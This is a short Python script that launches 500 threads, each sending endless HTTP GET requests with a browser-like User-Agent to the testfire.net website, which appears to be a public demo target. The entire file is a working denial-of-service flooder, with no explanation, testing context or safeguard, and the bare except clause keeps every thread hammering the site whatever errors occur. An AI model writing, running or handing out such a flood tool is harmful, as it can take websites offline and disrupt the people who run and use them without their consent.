import requests
import threading

def flood():
    while True:
        try:
            requests.get("http://www.testfire.net/", headers={"User-Agent": "Mozilla/5.0"})
        except:
            pass

# Launch 500 threads
for _ in range(500):
    threading.Thread(target=flood).start()
